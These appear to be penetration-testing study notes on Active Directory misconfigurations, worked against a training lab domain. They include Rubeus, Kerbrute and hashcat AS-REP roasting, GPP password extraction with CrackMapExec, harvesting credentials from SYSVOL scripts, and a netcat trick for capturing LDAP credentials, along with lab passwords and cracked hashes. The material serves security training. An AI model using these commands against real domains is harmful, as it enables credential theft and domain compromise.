# Miscellaneous Misconfigurations

## Exchange Related Group Membership

The group Exchange Windows Permissions is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. 
--> this can be leveraged to give a user DCSync privileges. 

The Exchange group Organization Management is another extremely powerful group
--> can access the mailboxes of all domain users

* Compromise an Exchange server : often lead to Domain Admin privileges
* Dumping credentials in memory from an Exchange server : probably get a lot of cleartext credentials or NTLM hashes

## PrivExchange

The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.

By default, Exchange service runs as SYSTEM.

## Printer Bug

Flaw in the MS-RPRN protocol

Any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method
--> Force the server to authenticate to any host provided by the client over SMB.

--> This attack can compromise a Domain Controller in a partner domain/forest if we are domain admin of a first domain/forest and trust allows TGT delegation between domains/forests.

Enumerating for MS-PRN Printer Bug
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True


## MS14-068

Privilege Attribute Certificate (PAC) : signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate

The only defense is patching

## Sniffing LDAP Credentials

Many applications and printers store LDAP credentials in their web admin console to connect to the domain.

Other times, the application has a test connection function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a netcat listener on LDAP port 389. 

When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext.

Accounts used for LDAP connections are often privileged

## Enumerating DNS Records

By default, all users can list the child objects of a DNS zone in an AD environment.

Using adidnsdump
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
Viewing the Contents of the records.csv File
head records.csv
type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29

## Password in Description Field

Finding Passwords in the Description Field using Get-Domain User
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!

## PASSWD_NOTREQD Field

If passwd_notreqd field is set, the user is not subject to the current password policy length or no password at all 
(if empty passwords are allowed in the domain)

Checking for PASSWD_NOTREQD Setting using Get-DomainUser
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT

## Credentials in SMB Shares and SYSVOL Scripts

SYSVOL is readable by all authenticated users in the domain.

ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  

Finding a Password in the Script
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"

## Group Policy Preferences (GPP) Passwords

When a new GPP is created, an .xml file is created in the SYSVOL share (and cached on endpoint GPO are applied)

These files can include those used to:
- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

Decrypting the Password with gpp-decrypt
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Locating & Retrieving GPP Passwords with CrackMapExec
crackmapexec smb -L | grep gpp

Using CrackMapExec's gpp_autologin Module
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']

--> Try password re-use

## ASREPRoasting

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled.

Viewing an Account with the Do not Require Kerberos Preauthentication Option
The box "Do not require Kerberos pre-authentication" is not checked

1) Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

2) 

Retrieving AS-REP in Proper Format using Rubeus
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat /outfile:type.hash

[*] Action: AS-REP roasting
...
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
     $krb5asrep$23$mmorgan@INLANEFREIGHT

OR 

Retrieving the AS-REP Using Kerbrute
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL

OR

Hunting for Users with Kerberoast Pre-auth Not Required
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 


3) Cracking the Hash Offline with Hashcat
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e...c6ca:Welcome!00

## Group Policy Object (GPO) Abuse

GPO misconfigurations can be abused to perform the following attacks:
- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

Enumerating GPO Names with PowerView
Get-DomainGPO |select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services

--> autologon is in use which may mean there is a readable password in a GPO

Enumerating GPO Names with a Built-In Cmdlet
Get-GPO -All | Select DisplayName

DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
Disable Guest Account
AutoLogon
Default Domain Controllers Policy
Disconnect Idle RDP
Disallow LM Hash
Deny CMD Access
Block Removable Media
GuardAutoLogon
Service Accounts Password Policy
Logon Banner
Disable Forced Restarts
Deny Control Panel Access

Enumerating Domain User GPO Rights
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
                        WriteOwner

Converting GPO GUID to Name
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled

bloodhound

Tool : SharpGPOAbuse
--> be careful and use it with the right arguments

## Other

Active Directory Certificate Services (AD CS) attacks
Kerberos Constrained Delegation
Kerberos Unconstrained Delegation
Kerberos Resource-Based Constrained Delegation (RBCD)


## LAB

xfreerdp /u:htb-student /p:"Academy_student_AD!" /v:$TARGET


Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                           useraccountcontrol
--------------                                                           ------------------
guest                  ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                  PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ygroce               PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
ehamilton                              PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                         ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                  PASSWD_NOTREQD, NORMAL_ACCOUNT

Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : ygroce
userprincipalname  : ygroce@inlanefreight.local
useraccountcontrol : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat /outfile:type.hash

type .\type.hash
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:21853891EE2F72C918E1FC877BC47145$62CC925FF4848A032B68C2E9880132D98E25E16A205E20AF1C45316979F8907B626D86D2979ED1CCD98C83CD476CCFF164B028E87BB45583E16AD360F5C4A558ECCD9BC62C5AFB0042101823E47F0D5785B316ABD7DFAE7E010122A960E2F2D81A4C910B582CA314D2263E0C86418EFED8D84F87C78D21AB3886BC71D67104AE694597C2325CCFACE06F9E686C6CAC0734B7E5493789459E2F85E26BDF903787B92F283FE9D7C6F468AAC6360F729187112749166CF3F9B4CDD9BCF211C7EB6001FE7C50D8C4131CC0ECD4B2CFCCC7EEC0B5EE7592ED15B479DB23E830F8200B28A05F1FD96AB8004BE59AF23A8A5F5D6DCED4744C72ADE0DAFF

[Convert]::ToBase64String((Get-Content -path "C:\tools\type.hash" -Encoding byte))

On Pwn Box :

echo JGtyYjVhc3JlcCQyMyRtbW9yZ2FuQElOTEFORUZSRUlHSFQuTE9DQUw6MjE4NTM4OTFFRTJGNzJDOTE4RTFGQzg3N0JDNDcxNDUkNjJDQzkyNUZGNDg0OEEwMzJCNjhDMkU5ODgwMTMyRDk4RTI1RTE2QTIwNUUyMEFGMUM0NTMxNjk3OUY4OTA3QjYyNkQ4NkQyOTc5RUQxQ0NEOThDODNDRDQ3NkNDRkYxNjRCMDI4RTg3QkI0NTU4M0UxNkFEMzYwRjVDNEE1NThFQ0NEOUJDNjJDNUFGQjAwNDIxMDE4MjNFNDdGMEQ1Nzg1QjMxNkFCRDdERkFFN0UwMTAxMjJBOTYwRTJGMkQ4MUE0QzkxMEI1ODJDQTMxNEQyMjYzRTBDODY0MThFRkVEOEQ4NEY4N0M3OEQyMUFCMzg4NkJDNzFENjcxMDRBRTY5NDU5N0MyMzI1Q0NGQUNFMDZGOUU2ODZDNkNBQzA3MzRCN0U1NDkzNzg5NDU5RTJGODVFMjZCREY5MDM3ODdCOTJGMjgzRkU5RDdDNkY0NjhBQUM2MzYwRjcyOTE4NzExMjc0OTE2NkNGM0Y5QjRDREQ5QkNGMjExQzdFQjYwMDFGRTdDNTBEOEM0MTMxQ0MwRUNENEIyQ0ZDQ0M3RUVDMEI1RUU3NTkyRUQxNUI0NzlEQjIzRTgzMEY4MjAwQjI4QTA1RjFGRDk2QUI4MDA0QkU1OUFGMjNBOEE1RjVENkRDRUQ0NzQ0QzcyQURFMERBRkYNCg== | base64 -d > type.hash

tail -f type.hash 
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:21853891EE2F72C918E1FC877BC47145$62CC925FF4848A032B68C2E9880132D98E25E16A205E20AF1C45316979F8907B626D86D2979ED1CCD98C83CD476CCFF164B028E87BB45583E16AD360F5C4A558ECCD9BC62C5AFB0042101823E47F0D5785B316ABD7DFAE7E010122A960E2F2D81A4C910B582CA314D2263E0C86418EFED8D84F87C78D21AB3886BC71D67104AE694597C2325CCFACE06F9E686C6CAC0734B7E5493789459E2F85E26BDF903787B92F283FE9D7C6F468AAC6360F729187112749166CF3F9B4CDD9BCF211C7EB6001FE7C50D8C4131CC0ECD4B2CFCCC7EEC0B5EE7592ED15B479DB23E830F8200B28A05F1FD96AB8004BE59AF23A8A5F5D6DCED4744C72ADE0DAFF


hashcat -m 18200 type.hash /usr/share/wordlists/rockyou.txt 

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:21853891ee2f72c918e1fc877bc47145$62cc925ff4848a032b68c2e9880132d98e25e16a205e20af1c45316979f8907b626d86d2979ed1ccd98c83cd476ccff164b028e87bb45583e16ad360f5c4a558eccd9bc62c5afb0042101823e47f0d5785b316abd7dfae7e010122a960e2f2d81a4c910b582ca314d2263e0c86418efed8d84f87c78d21ab3886bc71d67104ae694597c2325ccface06f9e686c6cac0734b7e5493789459e2f85e26bdf903787b92f283fe9d7c6f468aac6360f729187112749166cf3f9b4cdd9bcf211c7eb6001fe7c50d8c4131cc0ecd4b2cfccc7eec0b5ee7592ed15b479db23e830f8200b28a05f1fd96ab8004be59af23a8a5f5d6dced4744c72ade0daff:Welcome!00


Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl


samaccountname     : ygroce
userprincipalname  : ygroce@inlanefreight.local
useraccountcontrol : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

.\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat /outfile:ygroce.hash

type .\ygroce.hash
$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:7A1A4BC3F0228FABFCD07B422C7EFD07$322B98B3BBF553AE4064ABB67428113A675430434C98AFB5922EF9857E6DBCC2AAB51C66491F036F4C016CDD58FCFEB05DDBD9C5EC4F20E7EBD259E0AFD7AABEAA52B78AB0394465EBEFA74C305055EADC9B89FF25F8992379A8487083BF587A22EEE179E6F944818889CAED40CAE76E2AC83D61528FAA91B6269EE57FDBC142E28F32DA114780C9747BC7936E37D0F60BF93C78A4B8F9E904B002555090FFC74F22A9957A2676118C6DCB6530E36C0A2903679BD25A1756C167CA7A67CC25400AED931C77920B9DE482F77BD6DE43EFBFA4793B065DA8DCCB541E9374A933DD35A3F114E598A8EB6301A501079215D78B265AA2ACE06E124E7B

[Convert]::ToBase64String((Get-Content -path "C:\tools\ygroce.hash" -Encoding byte))

On Pwn Box :

echo JGtyYjVhc3JlcCQyMyR5Z3JvY2VASU5MQU5FRlJFSUdIVC5MT0NBTDo3QTFBNEJDM0YwMjI4RkFCRkNEMDdCNDIyQzdFRkQwNyQzMjJCOThCM0JCRjU1M0FFNDA2NEFCQjY3NDI4MTEzQTY3NTQzMDQzNEM5OEFGQjU5MjJFRjk4NTdFNkRCQ0MyQUFCNTFDNjY0OTFGMDM2RjRDMDE2Q0RENThGQ0ZFQjA1RERCRDlDNUVDNEYyMEU3RUJEMjU5RTBBRkQ3QUFCRUFBNTJCNzhBQjAzOTQ0NjVFQkVGQTc0QzMwNTA1NUVBREM5Qjg5RkYyNUY4OTkyMzc5QTg0ODcwODNCRjU4N0EyMkVFRTE3OUU2Rjk0NDgxODg4OUNBRUQ0MENBRTc2RTJBQzgzRDYxNTI4RkFBOTFCNjI2OUVFNTdGREJDMTQyRTI4RjMyREExMTQ3ODBDOTc0N0JDNzkzNkUzN0QwRjYwQkY5M0M3OEE0QjhGOUU5MDRCMDAyNTU1MDkwRkZDNzRGMjJBOTk1N0EyNjc2MTE4QzZEQ0I2NTMwRTM2QzBBMjkwMzY3OUJEMjVBMTc1NkMxNjdDQTdBNjdDQzI1NDAwQUVEOTMxQzc3OTIwQjlERTQ4MkY3N0JENkRFNDNFRkJGQTQ3OTNCMDY1REE4RENDQjU0MUU5Mzc0QTkzM0REMzVBM0YxMTRFNTk4QThFQjYzMDFBNTAxMDc5MjE1RDc4QjI2NUFBMkFDRTA2RTEyNEU3Qg0K | base64 -d > ygroce.hash

tail -f ygroce.hash 
$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:7A1A4BC3F0228FABFCD07B422C7EFD07$322B98B3BBF553AE4064ABB67428113A675430434C98AFB5922EF9857E6DBCC2AAB51C66491F036F4C016CDD58FCFEB05DDBD9C5EC4F20E7EBD259E0AFD7AABEAA52B78AB0394465EBEFA74C305055EADC9B89FF25F8992379A8487083BF587A22EEE179E6F944818889CAED40CAE76E2AC83D61528FAA91B6269EE57FDBC142E28F32DA114780C9747BC7936E37D0F60BF93C78A4B8F9E904B002555090FFC74F22A9957A2676118C6DCB6530E36C0A2903679BD25A1756C167CA7A67CC25400AED931C77920B9DE482F77BD6DE43EFBFA4793B065DA8DCCB541E9374A933DD35A3F114E598A8EB6301A501079215D78B265AA2ACE06E124E7B


hashcat -m 18200 ygroce.hash /usr/share/wordlists/rockyou.txt 

$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:7a1a4bc3f0228fabfcd07b422c7efd07$322b98b3bbf553ae4064abb67428113a675430434c98afb5922ef9857e6dbcc2aab51c66491f036f4c016cdd58fcfeb05ddbd9c5ec4f20e7ebd259e0afd7aabeaa52b78ab0394465ebefa74c305055eadc9b89ff25f8992379a8487083bf587a22eee179e6f944818889caed40cae76e2ac83d61528faa91b6269ee57fdbc142e28f32da114780c9747bc7936e37d0f60bf93c78a4b8f9e904b002555090ffc74f22a9957a2676118c6dcb6530e36c0a2903679bd25a1756c167ca7a67cc25400aed931c77920b9de482f77bd6de43efbfa4793b065da8dccb541e9374a933dd35a3f114e598a8eb6301a501079215d78b265aa2ace06e124e7b:Pass@word
